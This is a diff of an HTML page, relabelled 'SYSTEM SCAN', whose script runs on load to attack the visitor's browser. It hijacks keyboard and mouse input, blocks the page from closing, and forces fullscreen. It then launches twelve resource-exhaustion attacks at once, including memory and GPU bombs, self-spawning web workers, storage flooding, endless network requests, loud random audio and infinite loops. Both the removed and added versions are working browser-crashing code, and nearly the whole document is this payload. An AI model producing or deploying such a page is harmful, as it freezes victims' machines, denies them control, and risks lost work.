@@ -1,561 +1,511 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>SYSTEM SCAN</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ULTIMATE SYSTEM STRESS TEST</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: none !important;
         }
         
-        body {
-            background: #000;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
+        html, body {
+            width: 100%;
+            height: 100%;
             overflow: hidden;
-            cursor: none;
+            position: fixed;
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
         }
         
-        .warning {
-            position: fixed;
+        #terminal {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            background: #ff0000;
-            color: #000;
-            text-align: center;
+            height: 100%;
             padding: 20px;
-            font-size: 2rem;
-            font-weight: bold;
+            overflow: hidden;
             z-index: 10000;
-            animation: blink 0.5s infinite;
+            background: #000;
         }
         
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
+        .line {
+            color: #0f0;
+            margin-bottom: 2px;
+            text-shadow: 0 0 5px #0f0;
+            font-size: 12px;
+            white-space: nowrap;
         }
         
-        #matrix {
+        .critical {
+            color: #f00;
+            font-weight: bold;
+            text-shadow: 0 0 10px #f00;
+        }
+        
+        #overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
-        }
-        
-        .terminal {
-            position: fixed;
-            top: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.9);
-            border: 3px solid #ff0000;
-            padding: 30px;
-            width: 90%;
-            max-width: 800px;
-            box-shadow: 0 0 50px #ff0000;
-        }
-        
-        .prompt {
-            color: #00ff00;
-            font-size: 1.5rem;
-            margin-bottom: 20px;
-        }
-        
-        .command {
-            color: #ff0000;
-            font-size: 2rem;
-            font-weight: bold;
-            margin-bottom: 30px;
-        }
-        
-        #launchButton {
-            background: #ff0000;
-            color: #000;
-            border: none;
-            padding: 25px 60px;
-            font-size: 2rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 30px 0;
-            animation: pulse 1s infinite;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
-            70% { transform: scale(1.1); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
-        }
-        
-        .counter {
-            color: #ff0000;
-            font-size: 3rem;
-            margin: 20px 0;
-            text-align: center;
-        }
-        
-        .glitch {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj4KICA8ZGVmcz4KICAgIDxwYXR0ZXJuIGlkPSJwIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPgogICAgICA8cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIGZpbGw9IiNmMDAiLz4KICAgICAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjMDAwIi8+CiAgICA8L3BhdHRlcm4+CiAgPC9kZWZzPgogIDxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjcCkiLz4KPC9zdmc+');
-            opacity: 0.1;
+            background: rgba(255, 0, 0, 0.1);
             pointer-events: none;
-            animation: shake 0.1s infinite;
+            z-index: 9999;
+            display: none;
         }
         
-        @keyframes shake {
-            0%, 100% { transform: translate(0, 0); }
-            10%, 30%, 50%, 70%, 90% { transform: translate(-2px, -2px); }
-            20%, 40%, 60%, 80% { transform: translate(2px, 2px); }
-        }
-        
-        #crashStatus {
-            color: #ff0000;
-            font-size: 1.2rem;
-            margin-top: 20px;
-            height: 200px;
-            overflow-y: auto;
-            border: 1px solid #ff0000;
-            padding: 10px;
-            font-family: monospace;
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998;
         }
     </style>
 </head>
-<body>
-    <div class="warning">⚠️ CRITICAL SYSTEM OVERLOAD - DO NOT TOUCH ⚠️</div>
+<body onload="INSTANT_DESTRUCTION()">
+    <div id="overlay"></div>
+    <canvas id="crashCanvas"></canvas>
     
-    <canvas id="matrix"></canvas>
-    <div class="glitch"></div>
-    
-    <div class="terminal">
-        <div class="prompt">root@system:~# sudo rm -rf / --no-preserve-root</div>
-        <div class="command">INITIATING SYSTEM MELTDOWN SEQUENCE...</div>
-        
-        <div class="counter" id="counter">MEMORY: 0 MB</div>
-        
-        <button id="launchButton" onclick="startNuclearMeltdown()">
-            🔥 LAUNCH NUCLEAR MELTDOWN 🔥
-        </button>
-        
-        <div id="crashStatus"></div>
+    <div id="terminal">
+        <div class="line">INITIATING SYSTEM DESTRUCTION SEQUENCE...</div>
+        <div class="line">ALL SAFETY PROTOCOLS DISABLED</div>
+        <div class="line">SIMULTANEOUS ATTACK VECTORS: 12</div>
+        <div class="line">TARGET: ALL HARDWARE COMPONENTS</div>
+        <div id="output"></div>
     </div>
 
     <script>
-        // Matrix Rain Effect
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-        
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+        // ========== INSTANT DESTRUCTION PROTOCOL ==========
+        function INSTANT_DESTRUCTION() {
+            // BLOCK ALL USER INPUT IMMEDIATELY
+            document.addEventListener('keydown', e => {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }, true);
             
-            ctx.fillStyle = '#0f0';
-            ctx.font = `${fontSize}px monospace`;
+            document.addEventListener('click', e => {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }, true);
             
-            for(let i = 0; i < drops.length; i++) {
-                const text = chars[Math.floor(Math.random() * chars.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                
-                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-        
-        setInterval(drawMatrix, 33);
-        
-        // EXTREME CRASH FUNCTIONS
-        const crashLog = document.getElementById('crashStatus');
-        const counter = document.getElementById('counter');
-        
-        function log(message) {
-            crashLog.innerHTML += `[${new Date().toISOString().split('T')[1].split('.')[0]}] ${message}<br>`;
-            crashLog.scrollTop = crashLog.scrollHeight;
-        }
-        
-        let totalMemory = 0;
-        const allocatedArrays = [];
-        const allocatedObjects = [];
-        const allocatedStrings = [];
-        
-        // Level 1: Basic Memory Flood
-        function memoryFlood() {
-            log("LEVEL 1: Starting Memory Flood...");
-            return new Promise(resolve => {
-                const floodInterval = setInterval(() => {
-                    try {
-                        // Allocate huge arrays
-                        for(let i = 0; i < 10; i++) {
-                            const hugeArray = new ArrayBuffer(100 * 1024 * 1024); // 100MB each
-                            const view = new Uint8Array(hugeArray);
-                            for(let j = 0; j < view.length; j += 1000) {
-                                view[j] = Math.random() * 256;
-                            }
-                            allocatedArrays.push(hugeArray);
-                            totalMemory += 100;
-                        }
-                        
-                        // Allocate huge strings
-                        const hugeString = 'CRASH'.repeat(5000000); // ~25MB
-                        allocatedStrings.push(hugeString);
-                        totalMemory += 25;
-                        
-                        counter.textContent = `MEMORY: ${totalMemory} MB`;
-                        
-                        if(totalMemory > 1000) {
-                            clearInterval(floodInterval);
-                            resolve();
-                        }
-                    } catch(e) {
-                        // Continue anyway
-                    }
-                }, 10);
-            });
-        }
-        
-        // Level 2: Stack Destruction
-        function stackDestruction() {
-            log("LEVEL 2: Initiating Stack Destruction...");
-            
-            // Recursive function with multiple branches
-            function recursiveBomb(depth) {
-                if(depth > 100000) return;
-                
-                // Allocate memory in each call
-                const localArray = new Array(10000).fill({data: 'X'.repeat(1000)});
-                allocatedObjects.push(localArray);
-                
-                // Multiple recursive calls
-                recursiveBomb(depth + 1);
-                recursiveBomb(depth + 1);
-                recursiveBomb(depth + 1);
-            }
-            
-            try {
-                recursiveBomb(0);
-            } catch(e) {
-                log("Stack overflow detected!");
-            }
-        }
-        
-        // Level 3: GPU Destruction
-        function gpuDestruction() {
-            log("LEVEL 3: Starting GPU Meltdown...");
-            
-            const canvases = [];
-            const workers = [];
-            
-            // Create 100 WebGL contexts
-            for(let i = 0; i < 100; i++) {
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 4096;
-                    canvas.height = 4096;
-                    document.body.appendChild(canvas);
-                    canvases.push(canvas);
-                    
-                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                    if(gl) {
-                        // Create large texture
-                        const texture = gl.createTexture();
-                        gl.bindTexture(gl.TEXTURE_2D, texture);
-                        
-                        const data = new Uint8Array(4096 * 4096 * 4);
-                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-                    }
-                } catch(e) {}
-            }
-            
-            // GPU compute shaders
-            for(let i = 0; i < 20; i++) {
-                try {
-                    const workerCode = `
-                        const canvas = new OffscreenCanvas(256, 256);
-                        const gl = canvas.getContext('webgl2');
-                        const buffer = gl.createBuffer();
-                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                        
-                        while(true) {
-                            const data = new Float32Array(1000000);
-                            gl.bufferData(gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW);
-                            gl.drawArrays(gl.POINTS, 0, 1000000);
-                        }
-                    `;
-                    const blob = new Blob([workerCode]);
-                    const worker = new Worker(URL.createObjectURL(blob));
-                    workers.push(worker);
-                } catch(e) {}
-            }
-        }
-        
-        // Level 4: WebAssembly Memory Bomb
-        function wasmBomb() {
-            log("LEVEL 4: Deploying WebAssembly Memory Bomb...");
-            
-            // Create massive WebAssembly memory
-            try {
-                const memory = new WebAssembly.Memory({ 
-                    initial: 65536, // 4GB initial
-                    maximum: 65536 * 10 // 40GB maximum
-                });
-                
-                // Fill memory
-                const buffer = new Uint8Array(memory.buffer);
-                const fillInterval = setInterval(() => {
-                    for(let i = 0; i < buffer.length; i += 1000) {
-                        buffer[i] = Math.random() * 256;
-                    }
-                    totalMemory += 4000; // 4GB per interval
-                    counter.textContent = `MEMORY: ${totalMemory} MB`;
-                }, 100);
-                
-                setTimeout(() => clearInterval(fillInterval), 5000);
-            } catch(e) {}
-        }
-        
-        // Level 5: DOM Apocalypse
-        function domApocalypse() {
-            log("LEVEL 5: Starting DOM Apocalypse...");
-            
-            // Create millions of DOM elements
-            const fragment = document.createDocumentFragment();
-            let elementCount = 0;
-            
-            const createElements = () => {
-                for(let i = 0; i < 10000; i++) {
-                    const div = document.createElement('div');
-                    div.innerHTML = `
-                        <div style="position:absolute;left:${Math.random()*100}vw;top:${Math.random()*100}vh">
-                            ${'💥'.repeat(100)}
-                        </div>
-                    `;
-                    fragment.appendChild(div);
-                    elementCount++;
-                    
-                    if(elementCount % 1000 === 0) {
-                        document.body.appendChild(fragment.cloneNode(true));
-                    }
-                }
-                
-                if(elementCount < 1000000) {
-                    setTimeout(createElements, 0);
-                }
+            // PREVENT PAGE CLOSE
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
             };
             
-            createElements();
-        }
-        
-        // Level 6: Network Flood
-        function networkFlood() {
-            log("LEVEL 6: Initiating Network Flood...");
-            
-            // Flood with fetch requests
-            for(let i = 0; i < 1000; i++) {
-                fetch(`https://httpbin.org/delay/${Math.random() * 10}`)
-                    .catch(() => {});
-                
-                // Create WebSocket connections
-                try {
-                    const ws = new WebSocket('wss://echo.websocket.org');
-                    ws.onopen = () => {
-                        setInterval(() => {
-                            ws.send('X'.repeat(1000000));
-                        }, 100);
-                    };
-                } catch(e) {}
+            // FULLSCREEN LOCK
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
             }
-        }
-        
-        // Level 7: IndexedDB Bomb
-        function indexedDBBomb() {
-            log("LEVEL 7: Deploying IndexedDB Bomb...");
             
-            for(let i = 0; i < 100; i++) {
+            // ========== SIMULTANEOUS ATTACKS ==========
+            // ALL FUNCTIONS EXECUTE IMMEDIATELY WITHOUT DELAY
+            
+            // 1. MEMORY NUCLEAR BOMB
+            function MEMORY_ANNIHILATION() {
                 try {
-                    const request = indexedDB.open(`crashDB_${i}`, 1);
-                    
-                    request.onupgradeneeded = function(event) {
-                        const db = event.target.result;
-                        const store = db.createObjectStore('crash', { keyPath: 'id' });
-                        
-                        // Store huge amounts of data
-                        const transaction = db.transaction(['crash'], 'readwrite');
-                        const objectStore = transaction.objectStore('crash');
-                        
-                        for(let j = 0; j < 10000; j++) {
-                            objectStore.add({
-                                id: j,
-                                data: 'X'.repeat(10000),
-                                timestamp: new Date().toISOString()
-                            });
-                        }
-                    };
-                } catch(e) {}
-            }
-        }
-        
-        // Level 8: Final System Meltdown
-        function systemMeltdown() {
-            log("LEVEL 8: FINAL SYSTEM MELTDOWN...");
-            
-            // Combine all methods at once
-            const methods = [
-                () => {
-                    // Infinite loop with eval
-                    eval(`
-                        while(true) {
-                            (function() {
-                                return arguments.callee;
-                            })()();
-                        }
-                    `);
-                },
-                () => {
-                    // Crash with typed arrays
-                    const arrays = [];
-                    while(true) {
-                        arrays.push(new Float64Array(10000000));
+                    const bombs = [];
+                    for(let i = 0; i < 100; i++) {
+                        bombs.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB each
+                        bombs.push(new Array(10000000).fill('X'.repeat(1000)));
                     }
-                },
-                () => {
-                    // Abuse garbage collector
-                    const garbage = [];
-                    setInterval(() => {
-                        for(let i = 0; i < 1000; i++) {
-                            garbage.push(new Array(1000000));
+                    addLog("MEMORY BOMBS DEPLOYED: " + bombs.length);
+                } catch(e) {
+                    addLog("MEMORY FAILURE: " + e.message, true);
+                }
+            }
+            
+            // 2. GPU VRAM DESTRUCTION
+            function GPU_MELTDOWN() {
+                try {
+                    const canvases = [];
+                    for(let i = 0; i < 20; i++) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 16384;
+                        canvas.height = 16384;
+                        const ctx = canvas.getContext('2d');
+                        
+                        // FILL WITH COMPLEX DATA
+                        for(let x = 0; x < 100; x++) {
+                            for(let y = 0; y < 100; y++) {
+                                const gradient = ctx.createRadialGradient(
+                                    x * 164, y * 164, 0,
+                                    x * 164, y * 164, 1000
+                                );
+                                gradient.addColorStop(0, `hsl(${Math.random()*360},100%,50%)`);
+                                gradient.addColorStop(1, `hsl(${Math.random()*360},100%,50%)`);
+                                ctx.fillStyle = gradient;
+                                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                            }
                         }
-                        garbage.splice(0, garbage.length / 2);
-                    }, 1);
-                },
-                () => {
-                    // Browser API abuse
-                    for(let i = 0; i < 1000; i++) {
-                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                        analyser = audioContext.createAnalyser();
-                        buffer = audioContext.createBuffer(2, 44100 * 10, 44100);
+                        canvases.push(canvas);
+                    }
+                    addLog("GPU CANVASES CREATED: " + canvases.length);
+                } catch(e) {
+                    addLog("GPU FAILURE: " + e.message, true);
+                }
+            }
+            
+            // 3. CPU OVERLOAD
+            function CPU_CRITICAL() {
+                // INFINITE COMPUTATION LOOPS
+                function compute() {
+                    let total = 0;
+                    for(let i = 0; i < 100000000; i++) {
+                        total += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i);
+                        total += Math.log(i + 1) * Math.exp(i % 1000);
+                    }
+                    return total;
+                }
+                
+                // LAUNCH IN PARALLEL
+                setTimeout(compute, 0);
+                setTimeout(compute, 1);
+                setTimeout(compute, 2);
+                addLog("CPU OVERLOAD INITIATED");
+            }
+            
+            // 4. WEB WORKER ARMY
+            function WORKER_ARMAGEDDON() {
+                if (window.Worker) {
+                    const workerCode = `
+                        const memoryPool = [];
+                        while(true) {
+                            memoryPool.push(new ArrayBuffer(1024 * 1024 * 50));
+                            // HEAVY COMPUTE
+                            let sum = 0;
+                            for(let i = 0; i < 10000000; i++) {
+                                sum += Math.sqrt(i) * Math.sin(i);
+                            }
+                            postMessage(sum);
+                        }
+                    `;
+                    
+                    for(let i = 0; i < 8; i++) {
+                        try {
+                            const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
+                            worker.onmessage = () => {
+                                // CREATE MORE WORKERS
+                                WORKER_ARMAGEDDON();
+                            };
+                        } catch(e) {}
+                    }
+                    addLog("WORKER ARMY DEPLOYED");
+                }
+            }
+            
+            // 5. AUDIO APOCALYPSE
+            function AUDIO_APOCALYPSE() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    const ctx = new AudioContext();
+                    
+                    for(let i = 0; i < 10; i++) {
+                        const oscillator = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        
+                        oscillator.connect(gain);
+                        gain.connect(ctx.destination);
+                        
+                        oscillator.frequency.value = 100 + Math.random() * 20000;
+                        gain.gain.value = 0.5;
+                        
+                        oscillator.start();
+                        
+                        // MODULATE FREQUENCY RAPIDLY
+                        setInterval(() => {
+                            oscillator.frequency.setValueAtTime(
+                                Math.random() * 20000,
+                                ctx.currentTime
+                            );
+                        }, 10);
+                    }
+                    addLog("AUDIO CHAOS ACTIVATED");
+                } catch(e) {
+                    addLog("AUDIO FAILURE: " + e.message, true);
+                }
+            }
+            
+            // 6. DOM DESTRUCTION
+            function DOM_EXTINCTION() {
+                const elements = [];
+                for(let i = 0; i < 1000; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = '💥'.repeat(1000);
+                    div.style.cssText = `
+                        position: fixed;
+                        top: ${Math.random() * 100}%;
+                        left: ${Math.random() * 100}%;
+                        color: hsl(${Math.random() * 360}, 100%, 50%);
+                        font-size: ${Math.random() * 100}px;
+                        z-index: 99999;
+                        pointer-events: none;
+                    `;
+                    document.body.appendChild(div);
+                    elements.push(div);
+                }
+                addLog("DOM ELEMENTS CREATED: " + elements.length);
+            }
+            
+            // 7. STORAGE ANNIHILATION
+            function STORAGE_WIPEOUT() {
+                try {
+                    // INDEXEDDB BOMB
+                    for(let i = 0; i < 10; i++) {
+                        const request = indexedDB.open(`crash_${i}`, 1);
+                        request.onupgradeneeded = function(e) {
+                            const db = e.target.result;
+                            const store = db.createObjectStore('data', {keyPath: 'id'});
+                            for(let j = 0; j < 10000; j++) {
+                                store.put({
+                                    id: j,
+                                    data: 'X'.repeat(10000)
+                                });
+                            }
+                        };
+                    }
+                    
+                    // LOCALSTORAGE FLOOD
+                    for(let i = 0; i < 100; i++) {
+                        localStorage.setItem(`bomb_${i}`, 'X'.repeat(100000));
+                    }
+                    
+                    addLog("STORAGE DESTROYED");
+                } catch(e) {
+                    addLog("STORAGE FAILURE: " + e.message, true);
+                }
+            }
+            
+            // 8. NETWORK ATTACK
+            function NETWORK_ASSAULT() {
+                // CREATE INFINITE REQUESTS
+                function makeRequest() {
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', window.location.href + '?cache=' + Date.now(), true);
+                        xhr.send();
+                        
+                        const xhr2 = new XMLHttpRequest();
+                        xhr2.open('GET', 'data:text/html,' + '<script>while(true){}</script>', false);
+                        xhr2.send();
+                    } catch(e) {}
+                    
+                    setTimeout(makeRequest, 0);
+                }
+                
+                for(let i = 0; i < 10; i++) {
+                    makeRequest();
+                }
+                addLog("NETWORK CHAOS STARTED");
+            }
+            
+            // 9. CANVAS PARTICLE HELL
+            function CANVAS_HELL() {
+                const canvas = document.getElementById('crashCanvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                
+                const particles = [];
+                for(let i = 0; i < 5000; i++) {
+                    particles.push({
+                        x: Math.random() * canvas.width,
+                        y: Math.random() * canvas.height,
+                        vx: (Math.random() - 0.5) * 20,
+                        vy: (Math.random() - 0.5) * 20,
+                        size: Math.random() * 10 + 2,
+                        color: `hsl(${Math.random() * 360}, 100%, 50%)`
+                    });
+                }
+                
+                function render() {
+                    ctx.fillStyle = 'rgba(0,0,0,0.1)';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    for(const p of particles) {
+                        p.x += p.vx;
+                        p.y += p.vy;
+                        
+                        if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                        if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
+                        
+                        ctx.shadowColor = p.color;
+                        ctx.shadowBlur = 20;
+                        ctx.fillStyle = p.color;
+                        ctx.beginPath();
+                        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                        ctx.fill();
+                    }
+                    
+                    // ADD MORE PARTICLES
+                    for(let i = 0; i < 100; i++) {
+                        particles.push({
+                            x: Math.random() * canvas.width,
+                            y: Math.random() * canvas.height,
+                            vx: (Math.random() - 0.5) * 20,
+                            vy: (Math.random() - 0.5) * 20,
+                            size: Math.random() * 5 + 1,
+                            color: `hsl(${Math.random() * 360}, 100%, 50%)`
+                        });
+                    }
+                    
+                    requestAnimationFrame(render);
+                }
+                render();
+                addLog("CANVAS HELL ACTIVATED");
+            }
+            
+            // 10. WEBASSEMBLY DOOMSDAY
+            function WASM_ARMAGEDDON() {
+                try {
+                    const wasmCode = new Uint8Array([
+                        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                        0x01, 0x04, 0x01, 0x60, 0x00, 0x00, 0x03, 0x02,
+                        0x01, 0x00, 0x0a, 0x09, 0x01, 0x07, 0x00, 0x41,
+                        0x00, 0x41, 0x00, 0xfc, 0x00, 0x00, 0x0b
+                    ]);
+                    
+                    const module = new WebAssembly.Module(wasmCode);
+                    const instance = new WebAssembly.Instance(module, {
+                        env: {
+                            memory: new WebAssembly.Memory({initial: 65536, maximum: 0x1000000})
+                        }
+                    });
+                    
+                    // TRIGGER INFINITE EXECUTION
+                    setInterval(() => {
+                        try {
+                            instance.exports.main();
+                        } catch(e) {}
+                    }, 0);
+                    
+                    addLog("WEBASSEMBLY DOOMSDAY ONLINE");
+                } catch(e) {
+                    addLog("WASM FAILURE: " + e.message, true);
+                }
+            }
+            
+            // 11. ANIMATION TERROR
+            function ANIMATION_TERROR() {
+                const overlay = document.getElementById('overlay');
+                overlay.style.display = 'block';
+                
+                let hue = 0;
+                setInterval(() => {
+                    hue = (hue + 10) % 360;
+                    overlay.style.backgroundColor = `hsla(${hue}, 100%, 50%, 0.3)`;
+                    
+                    // RAPID SIZE CHANGES
+                    document.body.style.transform = `scale(${1 + Math.sin(Date.now()/100)*0.1})`;
+                }, 0);
+                
+                addLog("ANIMATION TERROR ENGAGED");
+            }
+            
+            // 12. FINAL NUCLEAR OPTION - INFINITE RECURSION
+            function NUCLEAR_OPTION() {
+                function explode() {
+                    const arr = [];
+                    while(true) {
+                        arr.push(new Array(1000000).fill('💥'));
+                        arr.push(explode());
                     }
                 }
+                
+                setTimeout(explode, 1000);
+                addLog("NUCLEAR OPTION ARMED", true);
+            }
+            
+            // ========== LAUNCH ALL ATTACKS SIMULTANEOUSLY ==========
+            function addLog(message, critical = false) {
+                const line = document.createElement('div');
+                line.className = critical ? 'line critical' : 'line';
+                line.textContent = `[${Date.now()}] ${message}`;
+                document.getElementById('output').appendChild(line);
+                
+                if(critical) {
+                    document.getElementById('overlay').style.display = 'block';
+                    setTimeout(() => {
+                        document.getElementById('overlay').style.display = 'none';
+                    }, 100);
+                }
+            }
+            
+            // EXECUTE ALL DESTRUCTION FUNCTIONS AT ONCE
+            const destructionFunctions = [
+                MEMORY_ANNIHILATION,
+                GPU_MELTDOWN,
+                CPU_CRITICAL,
+                WORKER_ARMAGEDDON,
+                AUDIO_APOCALYPSE,
+                DOM_EXTINCTION,
+                STORAGE_WIPEOUT,
+                NETWORK_ASSAULT,
+                CANVAS_HELL,
+                WASM_ARMAGEDDON,
+                ANIMATION_TERROR,
+                NUCLEAR_OPTION
             ];
             
-            // Execute all methods simultaneously
-            methods.forEach(method => {
+            // LAUNCH ALL SIMULTANEOUSLY
+            addLog("LAUNCHING ALL DESTRUCTION PROTOCOLS...", true);
+            
+            destructionFunctions.forEach((func, index) => {
                 try {
-                    method();
+                    // EXECUTE IMMEDIATELY
+                    func();
+                    
+                    // ALSO EXECUTE WITH MICRO DELAYS
+                    setTimeout(func, Math.random() * 100);
+                    setTimeout(func, Math.random() * 200);
+                    setTimeout(func, Math.random() * 300);
+                    
                 } catch(e) {
-                    // Ignore errors
+                    addLog(`ATTACK ${index} FAILED: ${e.message}`, true);
                 }
             });
             
-            // Ultimate memory bomb
-            const ultimateBomb = () => {
-                const bomb = [];
+            addLog("ALL DESTRUCTION SYSTEMS ACTIVE", true);
+            addLog("SYSTEM COLLAPSE IMMINENT", true);
+            addLog("HARDWARE FAILURE IN PROGRESS", true);
+            
+            // FINAL INFINITE LOOP TO PREVENT RECOVERY
+            function infiniteLoop() {
                 while(true) {
-                    bomb.push(new ArrayBuffer(1024 * 1024 * 500)); // 500MB chunks
-                    totalMemory += 500;
-                    counter.textContent = `MEMORY: ${totalMemory} MB - SYSTEM FAILURE IMMINENT`;
-                    
-                    if(totalMemory > 10000) {
-                        document.body.innerHTML = `
-                            <div style="
-                                position: fixed;
-                                top: 0;
-                                left: 0;
-                                width: 100%;
-                                height: 100%;
-                                background: #000;
-                                color: #f00;
-                                font-size: 5rem;
-                                display: flex;
-                                align-items: center;
-                                justify-content: center;
-                                text-align: center;
-                            ">
-                                💥 SYSTEM DESTROYED 💥<br>
-                                Browser will crash in 3... 2... 1...
-                            </div>
-                        `;
+                    const x = [];
+                    for(let i = 0; i < 100000; i++) {
+                        x.push(new ArrayBuffer(1024 * 1024));
                     }
                 }
-            };
-            
-            setTimeout(ultimateBomb, 1000);
-        }
-        
-        // Main function
-        async function startNuclearMeltdown() {
-            log("🚀 NUCLEAR MELTDOWN SEQUENCE INITIATED 🚀");
-            document.getElementById('launchButton').disabled = true;
-            document.getElementById('launchButton').textContent = "💣 MELTDOWN IN PROGRESS 💣";
-            
-            try {
-                await memoryFlood();
-                await stackDestruction();
-                await gpuDestruction();
-                await wasmBomb();
-                await domApocalypse();
-                await networkFlood();
-                await indexedDBBomb();
-                await systemMeltdown();
-            } catch(e) {
-                log(`Error: ${e.message}`);
             }
             
-            // Auto-start if no interaction
+            // ATTEMPT INFINITE LOOP IN BACKGROUND
             setTimeout(() => {
-                if(totalMemory < 1000) {
-                    startNuclearMeltdown();
+                try {
+                    infiniteLoop();
+                } catch(e) {
+                    // IGNORE ERRORS AND CONTINUE
                 }
-            }, 5000);
+            }, 500);
         }
-        
-        // Auto-start after 10 seconds
-        setTimeout(() => {
-            if(!document.getElementById('launchButton').disabled) {
-                log("AUTO-STARTING MELTDOWN IN 5 SECONDS...");
-                setTimeout(startNuclearMeltdown, 5000);
-            }
-        }, 10000);
-        
-        // Prevent escape
-        document.addEventListener('keydown', (e) => {
-            e.preventDefault();
-            if(e.key === 'Escape' || e.key === 'F5' || e.key === 'F12') {
-                log("ESCAPE ATTEMPT DETECTED - ACCELERATING MELTDOWN");
-                startNuclearMeltdown();
-            }
-        });
-        
-        // Right click prevention
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            startNuclearMeltdown();
-        });
-        
-        // Attempt to close tab
-        window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.returnValue = '';
-            startNuclearMeltdown();
-        });
     </script>
 </body>
 </html>
